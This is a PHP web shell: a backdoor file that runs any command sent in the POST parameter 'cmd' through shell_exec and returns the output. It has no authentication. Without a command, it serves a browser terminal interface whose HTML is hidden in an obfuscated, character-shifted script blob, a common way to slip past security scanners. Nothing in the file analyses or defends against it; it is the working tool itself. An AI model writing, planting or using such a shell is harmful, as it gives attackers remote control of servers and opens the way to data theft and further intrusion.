<?php
$cmd=$_POST['cmd'];
if(isset($cmd)){
    $res=shell_exec($cmd);
    echo $res;
}else{
$htmlContent = <<<EOD
    <script>
        document.write(function(a){a=unescape(a);var c=String.fromCharCode(a.charCodeAt(0)-a.length);for(var i=1;i<a.length;i++){c+=String.fromCharCode(a.charCodeAt(i)-c.charCodeAt(i-1))}return c}("%u037D%5De%93%92%97%AD%A9%95e%88%DC%E1%D9%AAz%A4%DC%E1%D9%8C%8C%CD%CF%D5%A4_%87%D3%90%60z%A4%CD%C6%C5%A2z%A9%D2%D9%D5%81%83%CB%C9%D3%E5%D8%D9%B1_w%A9%9AseZ%60z%A9%D2%D9%D5%81%8E%CF%CE%D2%A2_%98%DF%CE%DC%E7%DF%E1%E6%96%85%D2%DD%E2%D9%D3%E2%B1_%99%E0%CD%D8%DC%A5%A1%C9%DB%DF%CC%C8%92%A4%E0%CD%D8%DC%94L%89%D7%D7%DD%DD%CA%CD%99%A0%D6%C4%CD%D1%A2n_%5ER%60z%B0%DD%DD%E0%D1%A3%92%B9%D7%DF%D6%D7%CF%CD%A8k%A3%DD%DD%E0%D1%A3z%AF%E7%ED%E5%D1%A3%A0%D1%D3%DD%F4%DD%C3%C4%CE%D2%D9%E1%E4%E3%D2%91%90%D2%DB%DB%E1%AC%5DT%96%96%96%96%96%A0%9E%D2%DB%DB%E1%AC%5D%89%CC%CC%CC%CC%CC%A1%A1%D5%DD%E2%A1%93%C7%CE%D6%D5%E5%B3%A7%DC%DD%DD%E2%E3%D1%C4%C8%A0%A8%CE%D3%D9%D0%D7%A8jk%AB%D1%C5%C8%CD%D7%D5%A1lb%A0%E8%F5%AB%A2%D9%D7%DF%D6%D7%CF%CD%E7%DD%D1%E1%D6%C9%D7%ACk%A1%E8%98%93%E2%DB%D5%CD%84%97%DF%D1%DD%D9%D8%E0%DC%DA%D0%A0%AB%D1%C5%C8%CD%D7%D5%A1ka%A0%E8%B3%A3%CD%CE%D0%CF%DC%AErh%A6%DE%A3%AA%E5%DB%D7%D8%D2%DB%E6%A4%A6%B3%9B%D6%E9%E3%AA%9E%D8%E7%E5%E2%E1%AC%AE%D9%DD%EC%AF%A1%D5%DD%E2%A1%A0%DC%E3%DF%9F%B2%A5%99%CD%D3%D9%CC%E2%AB%9D%E4%E9%E4%E5%E9%EF%F2%DF%D1%DD%D9%92%A0%E3%D1%C4%C8%9F%AA%E2%D7%E2%A0%8C%D7%DE%E5%E9%EF%F2%E0%CD%D8%DC%A2ka%60U%60%A1%D5%DD%E2%A1%93%C7%CE%D6%D5%E5%B3%A7%DC%DD%DD%E2%E3%D1%C4%C8%A0%A1%D5%DD%E2%A1%A4%DC%CE%D0%CF%DC%AE%A8%DD%E1%DF%CE%CD%A7%9D%C3%C4%CE%D2%D9%E1%E4%E3%D2%91%90%D2%DB%DB%E1%AC%AE%E6%D3%CF%E1%E3%D1%D3%D7%D3%E2%AF%9E%D2%DB%DB%E1%AC%B1%DF%D1%DD%D9%A0%9D%D1%E1%D6%C9%D7%AC%A8%DD%DD%D3%A0%AA%E4%E9%E0%D5%D7%D3%9F%A8%DD%DD%D3%A0%A1%D5%DD%E2%A1%A0%DC%E3%DF%9F%B2%A5%99%CD%D3%D9%CC%E2%AB%97%D7%DE%E5%E9%A1%90%D2%DD%E2%D5%CA%D7%D3%D7%ED%DF%CD%DC%E3%DC%CD%DA%B3%A0%D2%D1%DD%B3%A1%D5%DD%E2%A1%93%C7%CE%D6%D5%E5%B3%A7%DC%DD%DD%E2%E3%D1%C4%C8%A0%9C%CD%D5%D0%D5%9B%96%DD%D9%D2%E0%AD%9D%C8%D3%E2%D9%D7%AD%B2%DF%D1%DD%D9%92%A0%E3%D1%C4%C8%9F%AA%E2%D7%E2%B9k%A2%E7%ED%E5%D1%A3zk%97%CD%C6%C5%A2z%9E%D1%D3%DD%B7z%A0%CD%DF%96%83%CF%CD%D4%E6%B0_%96%D9%D7%DF%D6%D7%CF%CD%8E%91%DD%D1%CF%D5%CC%CE%A8_%88%D5%D2%D8%E8%BC%B7%DE%E5%E9%9CQd%5D%60z%A0%CD%DF%96%83%CF%CD%D4%E6%B0_%91%E4%E9%E4%E5%E9%96%8B%CD%A1_%91%E4%E9%E4%E5%E9%96%60zk%93%CD%DF%B4z%A0%CD%DF%96%83%CF%CD%D4%E6%B0_%8B%D7%DE%E5%E9%A1%90%D2%DD%E2%D5%CA%D7%D3%D7%94%60z%A0%CD%DF%96%83%CF%CD%D4%E6%B0_%92%E2%E1%DC%DD%E4%96%60b%60k%93%CD%DF%B4z%A5%D7%DE%E5%E9%94%94%ED%E9%D5%A2_%96%D9%DD%EC%96%8B%CD%A1_%8B%D7%DE%E5%E9%96%83%D6%E9%E3%D5%D5%D2%D8%E8%A2mzk%93%CD%DF%B4zk%93%CD%DF%B4zk%91%D1%D3%DD%B7zk%97%DC%E1%D9%AA"));
        const outputDiv = document.getElementById('output');
        const inputField = document.getElementById('input');

        function focusInput() {
            inputField.focus();
        }

         inputField.addEventListener('keydown', function(event) {
            if (event.key === 'Enter') {
                const command = inputField.value;
                if(command=="clear"){
                    outputDiv.innerHTML = '';
                    inputField.value = '';
                    outputDiv.scrollTop = outputDiv.scrollHeight;
                    return '';
                }else if(command==""){
                    return '';
                }
                fetch('',{
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8;'
                    },
                    body: 'cmd='+command
                })
                .then(response => response.text())
                .then(data => {
                    outputDiv.innerHTML += '$ '+ command+'\\n'+data;
                    inputField.value = '';
                    outputDiv.scrollTop = outputDiv.scrollHeight;
                });

            }
        });

    </script>
EOD;
echo $htmlContent;
}
?>
